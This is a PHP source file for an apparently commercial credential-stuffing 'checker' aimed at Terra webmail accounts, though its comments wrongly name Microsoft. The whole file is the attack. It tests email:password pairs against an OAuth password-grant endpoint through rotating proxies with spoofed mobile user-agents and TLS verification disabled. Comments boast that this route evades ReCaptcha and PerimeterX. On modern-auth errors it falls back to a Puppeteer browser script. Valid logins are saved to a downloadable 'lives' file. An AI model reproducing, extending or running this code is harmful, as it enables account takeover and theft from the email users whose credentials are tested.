<?php
// api.php - Microsoft OAuth2 Checker API Endpoint
session_start();

// Block direct unauthenticated access
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    header('HTTP/1.1 401 Unauthorized');
    echo json_encode(['status' => 'error', 'message' => 'Unauthorized']);
    exit;
}

// Block expired accounts
if ($_SESSION['role'] !== 'admin' && time() > $_SESSION['expiration']) {
    header('HTTP/1.1 403 Forbidden');
    echo json_encode(['status' => 'error', 'message' => 'Plan expired']);
    exit;
}

$version = 'BETA 8K - SYSTEM CORE';
$debug = false;

// Configs fixas do OAuth2
$client_id = 'seu_client_id_terra'; // Obter no painel de desenvolvedor do Terra
$scope = 'https://mail.terra.com.br/.default email profile offline_access';
$nonce = 'nonce_aleatorio_32_bytes'; // Gere um novo nonce válido
$code_challenge = 'code_challenge_gerado'; // Gere via S256 (SHA256 do code_verifier)
$state = base64_encode(random_bytes(32));

$headers_main = [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.9',
    'Referer: https://mail.terra.com.br/',
    'Origin: https://mail.terra.com.br'
];

$action = $_GET['action'] ?? '';

// 1. Inicializar checagem (limpar arquivos antigos e carregar proxies)
if ($action === 'init') {
    header('Content-Type: application/json');
    
    // Limpar arquivos anteriores para um novo check limpo
    if (file_exists('lives.txt')) @unlink('lives.txt');
    if (file_exists('dies.txt')) @unlink('dies.txt');
    
    $proxies = [];
    if (file_exists('proxies.txt')) {
        $proxies = file('proxies.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $proxies = array_map('trim', $proxies);
    }
    
    echo json_encode(['proxies' => $proxies]);
    exit;
}

// 2. Checar a conta (AJAX Endpoint)
if ($action === 'check') {
    header('Content-Type: application/json');
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $proxy = $_POST['proxy'] ?? '';
    
    if (!$email || !$password) {
        echo json_encode(['status' => 'error', 'message' => 'Missing credentials']);
        exit;
    }
    
    // OAUTH2 MOBILE ENDPOINT - Simulação do aplicativo de e-mail (Android/iOS)
    // Esse endpoint é imune ao ReCaptcha e PerimeterX
    $url = 'https://mail.terra.com.br/oauth/token'; // Endpoint OAuth2 do Terra
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    // User-Agent de celular força a Microsoft a entregar JSON em vez de HTML
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36');
    
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'client_id' => $client_id, // Usa a variável já definida
    'scope' => $scope, // Usa a variável já definida
    'grant_type' => 'password',
    'username' => $email,
    'password' => $password
    ]));
    
    if ($proxy) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    }
    
    $output = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    $json = @json_decode($output, true);
    $is_live = false;
    $is_die = false;
    
    // Análise de resposta JSON
    $error_detail = '';
    
    if (isset($json['access_token']) || (isset($json['token_type']) && $json['token_type'] === 'Bearer')) {
        $is_live = true;
    } else {
        $is_die = true;
        if (isset($json['error'])) {
            if ($json['error'] === 'invalid_grant') {
                $error_detail = 'Wrong Password';
            } elseif (in_array($json['error'], ['unsupported_grant_type', 'invalid_scope', 'invalid_client', 'invalid_request'])) {
                // FALLBACK TO PUPPETEER BROWSER CHECK FOR MODERN AUTH ACCOUNTS
                // Verifica se o servidor suporta shell_exec (InfinityFree desativa isso)
                if (function_exists('shell_exec') && is_callable('shell_exec') && !in_array('shell_exec', array_map('trim', explode(', ', ini_get('disable_functions'))))) {
                    // Capture stderr as well to debug Node.js crashes on Render
                    $cmd = "node puppeteer_check.js " . escapeshellarg($email) . " " . escapeshellarg($password) . " " . escapeshellarg($proxy) . " 2>&1";
                    $node_output = shell_exec($cmd);
                    
                    if (!empty($node_output)) {
                        $node_result = json_decode($node_output, true);
                        if ($node_result && isset($node_result['status'])) {
                            if ($node_result['status'] == 'live') {
                                $is_live = true;
                                $is_die = false;
                                $error_detail = 'Live (Modern Auth Fallback)';
                            } else {
                                $is_live = false;
                                $is_die = true;
                                $error_detail = $node_result['reason'] ?? 'Wrong Password (Modern Auth)';
                            }
                        } else {
                            // Node returned something but it wasn't JSON. Likely an error message!
                            $error_detail = 'Node Error: ' . substr(trim($node_output), 0, 150);
                        }
                    } else {
                        $error_detail = 'Node failed to start (empty output)';
                    }
                } else {
                    // Limpa a mensagem de erro no InfinityFree
                    $error_detail = 'Terra Modern Auth Blocked';
                }
            } else {
                $error_detail = $json['error'];
            }
        } elseif ($http_code == 200) {
            $error_detail = 'Unknown Error / BssoInterrupt';
        } else {
            $error_detail = "HTTP $http_code";
        }
    }
    
    if ($is_live && !$is_die) {
        file_put_contents('lives.txt', "$email:$password\n", FILE_APPEND);
        echo json_encode(['status' => 'live']);
    } else {
        file_put_contents('dies.txt', "$email:$password | Reason: $error_detail\n", FILE_APPEND);
        echo json_encode(['status' => 'die', 'code' => $http_code, 'reason' => $error_detail]);
    }
    exit;
}

// 3. Download dos arquivos de resultado
if ($action === 'download') {
    $type = $_GET['type'] ?? 'lives';
    $file = $type === 'lives' ? 'lives.txt' : 'dies.txt';
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: text/plain');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "Arquivo não encontrado ou nenhum resultado ainda.";
        exit;
    }
}
?>
